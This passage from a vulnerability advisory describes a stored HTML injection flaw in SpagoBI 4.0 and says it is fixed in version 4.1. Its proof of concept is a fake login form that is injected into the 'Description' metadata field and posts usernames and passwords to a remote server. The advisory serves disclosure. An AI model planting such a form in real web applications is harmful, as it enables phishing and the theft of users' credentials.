04. ### Vulnerability Description ###

SpagoBI contains a flaw that allows persistent  script insertion.
This may allow a remote attacker to inject HTML code including forms
that load on a remote site, which can allow the attacker to conduct a
phishing attack on a user and capture their credentials.


05. ### Technical Description / Proof of Concept Code ###

The vulnerability is located in some SpagoBI input fields
(e.g.'Description' input field from 'Short document metadata')

To reproduce the vulnerability,  the attacker (a malicious user) can add
the malicious HTML script code:

<form method="POST" action="http://server/login/login.php.">
Username: <input type="text" name="username" size="15" /><br />
Password: <input type="password" name="passwort" size="15" /><br />
<div align="center">
<p><input type="submit" value="Login" /></p>
</div>
</form>

in 'Description' input field from 'Short document metadata' and click on
save button.
The code execution happens when the victim (an unaware user)  click on
'Short document metadata'.

This is not the only way to inject malicious HTML code in the SpagoBI
web app.


06. ### Business Impact ###

Exploitation of the vulnerability requires low privileged application
user account but low or medium user interaction.  Successful
exploitation of the vulnerability results in persistent  phishing and
persistent external redirects.


07. ### Systems Affected ###

This vulnerability was tested against: SpagoBI 4.0
Older versions are probably affected too, but they were not checked.


08. ### Vendor Information, Solutions and Workarounds ###

This issue is fixed in SpagoBI v4.1, which can be downloaded from:
